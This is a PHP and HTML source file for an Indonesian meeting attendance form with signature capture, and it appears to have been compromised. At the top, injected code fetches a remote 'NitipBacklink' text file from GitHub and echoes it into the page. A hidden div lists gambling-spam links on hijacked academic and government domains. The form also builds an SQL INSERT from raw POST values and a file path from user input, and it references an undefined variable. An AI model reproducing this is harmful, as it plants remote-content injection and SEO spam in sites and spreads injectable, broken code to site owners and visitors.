<?php include('../config.php');
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
<!DOCTYPE html>
<html>
<head>
    <title>SISTEM DAFTAR HADIR</title>
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
   
    <script type="text/javascript" src="js/jquery.min.js"></script> 
    <link type="text/css" href="css/jquery-ui.css" rel="stylesheet"> 
    <script type="text/javascript" src="js/jquery-ui.min.js"></script>
   
    <script type="text/javascript" src="js/jquery.signature.min.js"></script>
    <script type="text/javascript" src="js/jquery.ui.touch-punch.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/jquery.signature.css">
    
    
    	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
   
    <style>
        .kbw-signature { width: 400px; height: 200px;}
        #sig canvas{
            width: 100% !important;
            height: auto;
        }
    </style>
   
   
   
</head>
<body>

	<nav class="navbar navbar-expand-lg navbar-light bg-light">
		<div class="container">
			<a class="navbar-brand" href="#"><H4><font color="blue"><b><CENTER>SISTEM DAFTAR HADIR</CENTER></b></font></H4></a>
			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
				<span class="navbar-toggler-icon"></span>
			</button>

			<div class="collapse navbar-collapse" id="navbarSupportedContent">
				<ul class="navbar-nav mr-auto">
					<li class="nav-item">
						<a class="nav-link" href="index.php"></a>
					</li>
					<li class="nav-item active">
						<a class="nav-link" href="tambah.php"></a>
					</li>
				</ul>
			</div>
		</div>
	</nav>
	
	<div class="container" style="margin-top:20px">
		<h2></h2>
				<div class="form-group row">
				<div class="col-sm-10">
				<?php 
include('../sistem_kehadiran/nolist.php');
?>
    	<?php
		date_default_timezone_set('Asia/Jakarta');
		if(isset($_POST['submit'])){
			$date          = date("d-m-Y H:i:s");
			$tanggal          = date("d-m-Y");
			$nomorhp		= $_POST['nomorhp'];
			$nama			= $_POST['nama'];
			$kode_rapat	    = $_POST['kode_rapat'];
			$nama_rapat		= $_POST['nama_rapat'];
			$email		    = $_POST['email'];
			$asal_institusi	= $_POST['asal_institusi'];
			$kepesertaan    = $_POST['kepesertaan'];
			$image          = $_POST['nama'].'_'.$_POST['kode_rapat'].'.'.'png';
			
			
		
			
			if(mysqli_num_rows($cek) == 0){
				$sql = mysqli_query($koneksi, "INSERT INTO peserta(nomorhp, nama, kode_rapat, nama_rapat, email, date, asal_institusi, kepesertaan, tanggal, image) VALUES('$nomorhp', '$nama', '$kode_rapat', '$nama_rapat', '$email', '$date', '$asal_institusi', '$kepesertaan', '$tanggal', '$image')") or die(mysqli_error($koneksi));
				
				if($sql){
					echo '<script>alert("Terima Kasih Anda Sudah Mengisi Daftar Hadir"); document.location="index.php";</script>';
				}else{
					echo '<div class="alert alert-warning">Gagal melakukan pengisian daftar hadir.</div>';
				}
			}
		}
?>

			
   	<form action="index.php" method="post">
			<div class="form-group row">
				<label class="col-sm-2 col-form-label">NAMA DAN GELAR</label>
				<div class="col-sm-10">
					<input type="text" name="nama" class="form-control" style=width:400px required>
				</div>
			</div>
		<div class="form-group row">
				<label class="col-sm-2 col-form-label">KODE RAPAT</label>
				<div class="col-sm-10">
					<input type="number" min=000 max=999 name="kode_rapat" class="form-control" placeholder="Kode Rapat 3 Digit" style=width:200px required>
				</div>
			</div>
		<div class="form-group row">
				<label class="col-sm-2 col-form-label">AGENDA RAPAT</label>
				<div class="col-sm-10">
					<input type="text" name="nama_rapat" style=width:500px class="form-control"  required>
				</div>
				</div>
					<div class="form-group row">
				<label class="col-sm-2 col-form-label">ASAL INSTITUSI</label>
				<div class="col-sm-10">
					<input type="text" style=width:300px name="asal_institusi" class="form-control"  required>
				</div>
			</div>
				<div class="form-group row">
				<label class="col-sm-2 col-form-label">KEPESERTAAN</label>
				<div class="col-sm-10">
					<input type="text" style=width:300px name="kepesertaan" class="form-control"  required>
				</div>
			</div>
				<div class="form-group row">
				<label class="col-sm-2 col-form-label">NOMOR HP (WA)</label>
				<div class="col-sm-10">
					<input type="number" style=width:200px name="nomorhp" class="form-control"  required>
				</div>
				</div>
				<div class="form-group row">
				<label class="col-sm-2 col-form-label">EMAIL AKTIF</label>
				<div class="col-sm-10">
					<input type="email" style=width:300px name="email" class="form-control"  required>
				</div>
			</div>
				<div class="form-group row">
			<label class="col-sm-2 col-form-label">TANDATANGAN</label>
   	<div class="col-sm-10">
        
            <label class="" for=""><font color="blue"><b>Silahkan bubuhkan Tandatangan Anda Disini!<br>Data Tidak akan terkirim jika belum ditandatangani.</font></b></label>
            <br/>
            <div id="sig" ></div>
            <br/>
            <br>
            <button class="btn btn-danger" id="clear">ULANGI TANDATANGAN</button>
            <textarea id="signature64" required name="signed" style="display: none" ></textarea>
        </div>
         </div>
   	<div class="form-group row">
				<label class="col-sm-2 col-form-label"></label>
   	<div class="col-sm-10">
        <button class="btn btn-success" name="submit">KIRIM DAFTAR HADIR</button>
        	</div>
	</div>
	<div class="form-group row">
				<label class="col-sm-2 col-form-label"></label>
   	<div class="col-sm-10">
        	<a href="datapeserta.php" target="_empty" class="btn btn-warning">LIHAT DAFTAR HADIR</a>
        	</div>
        	<div style="display:none;">
<a href="https://situs-toto.amikpgrikebumen.ac.id/" rel="dofollow">situs toto</a>
<a href="https://mesy.uika-bogor.ac.id/store/gates-of-olympus/" rel="dofollow">gates of olympus</a>
<a href="https://mesy.uika-bogor.ac.id/store/deposit-pulsa-tanpa-potongan/" rel="dofollow">slot deposit pulsa tanpa potongan</a>
<a href="https://daftar.upbatam.ac.id/uploads/2023/" rel="dofollow">slot thailand</a>
<a href="https://daftar.upbatam.ac.id/uploads/2022/" rel="dofollow">slot dana</a>
<a href="https://mi.unisbank.ac.id/" rel="dofollow">situs toto</a>
<a href="https://baronbudd.net/" rel="dofollow">situs toto</a>
<a href="https://fao.balinkbayan.gov.ph/" rel="dofollow">idn slot</a>
<a href="http://thenewage.net.au/" rel="dofollow">slot777</a>
<a href="https://info-data.itenas.ac.id/public/assets/situs-toto/" rel="dofollow">situs toto</a>
<a href="https://info-data.itenas.ac.id/public/assets/slot5k/" rel="dofollow">slot depo 5k</a>
<a href="https://info-data.itenas.ac.id/public/assets/idnslot/" rel="dofollow">idn slot</a>
<a href="https://info-data.itenas.ac.id/public/assets/danatoto/" rel="dofollow">dana toto</a>
<a href="https://info-data.itenas.ac.id/public/assets/demo/" rel="dofollow">slot demo</a>
</div>
	</div>
    </form>

<div class="container">
   
    <form method="post" action="index.php">
   
</div>        
   
</div>
   <?php
   
    $folderPath = "tandatangan/";
    if(empty($_POST['signed'])){
        echo "";
    }else{
    $image_parts = explode(";base64,", $_POST['signed']); 
    $image_type_aux = explode("image/", $image_parts[0]);
    $image_type = $image_type_aux[1];
    $image_base64 = base64_decode($image_parts[1]);
    $file = $folderPath . $nama.'_'.$kode_rapat.'.'.$image_type;
    file_put_contents($file, $image_base64);
    echo "";
    }
?>
<script type="text/javascript">
    var sig = $('#sig').signature({syncField: '#signature64', syncFormat: 'PNG'});
    $('#clear').click(function(e) {
        e.preventDefault();
        sig.signature('clear');
        $("#signature64").val('');
    });
</script>
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
</body>
</html>
